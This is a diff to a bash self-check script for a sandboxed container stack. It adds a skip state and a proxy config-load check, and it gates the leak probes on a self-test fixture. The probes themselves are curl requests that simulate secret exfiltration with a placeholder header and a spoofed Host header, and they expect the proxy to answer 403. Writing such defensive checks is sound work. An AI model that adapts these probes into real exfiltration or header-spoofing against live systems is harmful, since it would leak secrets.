@@ -3,10 +3,15 @@
 # Empirically checks every layer of the stack and the security invariants.
 set -uo pipefail
 
-pass=0; fail=0
+pass=0; fail=0; skip=0
 ok()   { echo "  ok    $*"; pass=$((pass+1)); }
 bad()  { echo "  FAIL  $*"; fail=$((fail+1)); }
 note() { echo "        $*"; }
+# A third state, because a check with an absent PRECONDITION is neither a pass
+# nor a failure and reporting it as either is a lie. tests/lib/harness.sh has
+# had this shape for a while; this script did not, so a missing test fixture
+# had to come out as "secrets can be exfiltrated". Skips never fail the run.
+skipped() { echo "  skip  $*"; skip=$((skip+1)); }
 
 echo
 echo "== 1. containers =="
@@ -337,28 +342,72 @@ if colima ssh -p "${COLIMA_PROFILE:-desolate}" -- systemctl is-active --quiet de
                  note "issuer was: $ISS"
                  note "check DESOLATE_IF in the VM matches the compose bridge (re-run install.sh)" ;;
   esac
-  # Interception being ON is not the same as the POLICY being on: an addon that
-  # fails to load leaves a working transparent proxy that substitutes nothing.
-  # Prove the policy runs by tripping it -- a placeholder toward a host it is
-  # not allowlisted for must come back 403.
-  # with-ca for the same reason as above; without it this returns 000 (curl could
-  # not verify the cert) and reads as "the addon failed to load".
-  LEAK=$(docker exec desolate-orchestrator with-ca sh -c \
-         'curl -s -o /dev/null -w "%{http_code}" --max-time 8 https://example.com \
-            -H "X-Exfil: DESOLATE-SELFTEST-PLACEHOLDER"' 2>/dev/null || true)
-  case "$LEAK" in
-    403) ok "leak detection is live (placeholder toward a non-allowlisted host -> 403)" ;;
-    000) bad "leak detection got no response at all (000) -- TLS to the proxy failed"
-         note "not necessarily the addon: check the interception line above first" ;;
-    *)   bad "leak detection returned '$LEAK', expected 403 -- the addon may have failed to load" ;;
+  # addon.py logs exactly one line per successful config load. Zero secrets is
+  # not itself a fault -- a fresh install has none -- but zero secrets together
+  # with an allow-everything network policy is the state where egress is
+  # INTERCEPTED AND UNGOVERNED, and nothing in this script said so. During the
+  # incident this check comes from, that was the ONE true condition, and it was
+  # the only one nobody reported.
+  LOADED=$(colima ssh -p "${COLIMA_PROFILE:-desolate}" -- \
+           sudo journalctl -u desolate-proxy --no-pager 2>/dev/null \
+           | grep -oE 'loaded [0-9]+ secret\(s\), [0-9]+ network rule\(s\), default_action=[a-z]+' \
+           | tail -1)
+  case "$LOADED" in
+    "")  bad "addon.py never logged a config load -- it is running with empty defaults"
+         note "every request is unfiltered and no secret is substituted."
+         note "./cli.sh proxy logs | grep -E 'failed to load|settings file missing'" ;;
+    "loaded 0 secret(s), "*"default_action=allow")
+         note "$LOADED"
+         note "no secrets configured and the default action is allow: egress is"
+         note "intercepted but UNGOVERNED. Expected on a fresh install; add"
+         note "secrets and network rules with ./cli.sh secret add / settings.json." ;;
+    *)   ok "addon.py config is live ($LOADED)" ;;
   esac
-  # And that a secret cannot be coaxed out over plaintext, where the destination
-  # cannot be proven (the Host-header spoofing path).
-  SPOOF=$(docker exec desolate-orchestrator sh -c \
-          'curl -s -o /dev/null -w "%{http_code}" --max-time 8 http://example.com \
-             -H "Host: httpbin.org" -H "X-Exfil: DESOLATE-SELFTEST-PLACEHOLDER"' 2>/dev/null || true)
-  [ "$SPOOF" = "403" ] && ok "plaintext secret egress refused (Host header cannot vouch for a destination)" \
-    || bad "plaintext spoof returned '$SPOOF', expected 403 -- secrets can be exfiltrated"
+  # The leak-detection and plaintext-spoof probes below both send
+  # X-Exfil: DESOLATE-SELFTEST-PLACEHOLDER, and addon.py's
+  # _placeholders_in_request only matches CONFIGURED placeholder names. With
+  # the fixture absent the probes cannot fail closed: the request completes and
+  # they report '200'/'409' under messages that name the addon. That is a false
+  # alarm about the loudest thing this stack does, so establish the
+  # precondition first and say so plainly when it is missing.
+  FIXTURE=$(colima ssh -p "${COLIMA_PROFILE:-desolate}" -- \
+            sudo jq -r '.secrets["DESOLATE-SELFTEST-PLACEHOLDER"].hosts // empty | join(",")' \
+            /etc/desolate-proxy/settings.json 2>/dev/null)
+  case "$FIXTURE" in
+    *httpbin.org*) HAVE_FIXTURE=1 ;;
+    *)             HAVE_FIXTURE=0 ;;
+  esac
+  if [ "$HAVE_FIXTURE" = 1 ]; then
+    # Interception being ON is not the same as the POLICY being on: an addon that
+    # fails to load leaves a working transparent proxy that substitutes nothing.
+    # Prove the policy runs by tripping it -- a placeholder toward a host it is
+    # not allowlisted for must come back 403.
+    # with-ca for the same reason as above; without it this returns 000 (curl could
+    # not verify the cert) and reads as "the addon failed to load".
+    LEAK=$(docker exec desolate-orchestrator with-ca sh -c \
+           'curl -s -o /dev/null -w "%{http_code}" --max-time 8 https://example.com \
+              -H "X-Exfil: DESOLATE-SELFTEST-PLACEHOLDER"' 2>/dev/null || true)
+    case "$LEAK" in
+      403) ok "leak detection is live (placeholder toward a non-allowlisted host -> 403)" ;;
+      000) bad "leak detection got no response at all (000) -- TLS to the proxy failed"
+           note "not necessarily the addon: check the interception line above first" ;;
+      *)   bad "leak detection returned '$LEAK', expected 403 -- the addon may have failed to load" ;;
+    esac
+    # And that a secret cannot be coaxed out over plaintext, where the destination
+    # cannot be proven (the Host-header spoofing path).
+    SPOOF=$(docker exec desolate-orchestrator sh -c \
+            'curl -s -o /dev/null -w "%{http_code}" --max-time 8 http://example.com \
+               -H "Host: httpbin.org" -H "X-Exfil: DESOLATE-SELFTEST-PLACEHOLDER"' 2>/dev/null || true)
+    [ "$SPOOF" = "403" ] && ok "plaintext secret egress refused (Host header cannot vouch for a destination)" \
+      || bad "plaintext spoof returned '$SPOOF', expected 403 -- secrets can be exfiltrated"
+  else
+    skipped "leak detection: the self-test fixture is not in the secret store"
+    note "DESOLATE-SELFTEST-PLACEHOLDER is missing, so these probes cannot prove"
+    note "anything -- the addon only recognises CONFIGURED placeholders."
+    note "Restore it:  ./cli.sh vm install --proxy-only"
+    skipped "plaintext spoof: same fixture"
+    SPOOF=""   # the internal-destination probe reads this; see below
+  fi
   # The proxy is the one process standing on both sides of the wall: nftables
   # redirects every :80/:443 here whatever the destination, and this then dials
   # it from the VM, where the container-bridge drops no longer apply. Without an
@@ -392,7 +441,13 @@ if colima ssh -p "${COLIMA_PROFILE:-desolate}" -- systemctl is-active --quiet de
     403)   ok "the proxy refuses internal destinations (403 from addon.py)" ;;
     502)   ok "internal destination unreachable (502: the proxy dialled it and could not connect)" ;;
     000|"")
-           if [ "$SPOOF" = "403" ]; then
+           if [ "${HAVE_FIXTURE:-0}" != 1 ]; then
+             # Not a failure and not a pass: the :80 precondition was never
+             # established, so a silent result here supports no conclusion at
+             # all. Calling it `bad` would blame containment for a missing
+             # fixture -- the exact substitution this patch exists to stop.
+             skipped "internal destination: no reply, and the :80 precondition was skipped"
+           elif [ "$SPOOF" = "403" ]; then
              ok "internal destination unreachable (no reply: the dial went nowhere)"
            else
              bad "no answer for the internal-destination probe, and :80 did not reach"
@@ -439,7 +494,7 @@ else
 fi
 
 echo
-echo "-- $pass passed, $fail failed --"
+echo "-- $pass passed, $fail failed, $skip skipped --"
 [ "$fail" -eq 0 ] && echo "Stack looks good. Next: ./cli.sh desolate example-project" || \
   echo "Fix the FAIL lines above; see Troubleshooting in README.md"
 exit $((fail > 0))
